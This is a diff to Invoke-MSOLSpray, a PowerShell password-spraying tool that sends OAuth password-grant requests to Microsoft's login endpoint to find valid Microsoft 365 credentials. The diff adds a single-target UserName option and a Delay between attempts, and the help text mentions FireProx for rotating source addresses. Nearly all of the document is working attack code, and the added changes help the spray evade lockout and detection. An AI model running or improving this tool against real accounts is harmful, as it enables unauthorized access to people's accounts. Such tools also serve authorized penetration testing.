@@ -1,4 +1,4 @@
-﻿function Invoke-MSOLSpray{
+function Invoke-MSOLSpray{
 
 <#
     .SYNOPSIS
@@ -17,10 +17,18 @@
         
         UserList file filled with usernames one-per-line in the format "user@domain.com"
     
+    .PARAMETER UserName
+
+        A single user to spray in the format "user@domain.com".
+
     .PARAMETER Password
         
         A single password that will be used to perform the password spray.
     
+    .PARAMETER Delay
+
+        A number in seconds to delay between requests.
+
     .PARAMETER OutFile
         
         A file to output valid results to.
@@ -35,10 +43,10 @@
     
     .EXAMPLE
         
-        C:\PS> Invoke-MSOLSpray -UserList .\userlist.txt -Password Winter2020
+        C:\PS> Invoke-MSOLSpray -UserName user@company.com -Password Winter2020
         Description
         -----------
-        This command will use the provided userlist and attempt to authenticate to each account with a password of Winter2020.
+        This command will use the provided username and attempt to authenticate to with a password of Winter2020.
     
     .EXAMPLE
         
@@ -60,7 +68,15 @@
 
     [Parameter(Position = 2, Mandatory = $False)]
     [string]
+    $UserName = "",
+
+    [Parameter(Position = 3, Mandatory = $False)]
+    [string]
     $Password = "",
+
+    [Parameter(Position = 4, Mandatory = $False)]
+    [Int]
+    $Delay = 0,
 
     # Change the URL if you are using something like FireProx
     [Parameter(Position = 3, Mandatory = $False)]
@@ -73,7 +89,12 @@
   )
     
     $ErrorActionPreference= 'silentlycontinue'
-    $Usernames = Get-Content $UserList
+    
+    if ($UserName -ne "") {
+        $Usernames = $UserName
+    } else {
+        $Usernames = Get-Content $UserList
+    }
     $count = $Usernames.count
     $curr_user = 0
     $lockout_count = 0
@@ -94,6 +115,9 @@
         # Setting up the web request
         $BodyParams = @{'resource' = 'https://graph.windows.net'; 'client_id' = '1b730954-1685-4b74-9bfd-dac224a7b894' ; 'client_info' = '1' ; 'grant_type' = 'password' ; 'username' = $username ; 'password' = $password ; 'scope' = 'openid'}
         $PostHeaders = @{'Accept' = 'application/json'; 'Content-Type' =  'application/x-www-form-urlencoded'}
+        if ($Delay) {
+            Start-Sleep -Seconds $Delay
+        }
         $webrequest = Invoke-WebRequest $URL/common/oauth2/token -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr 
 
         # If we get a 200 response code it's a valid cred
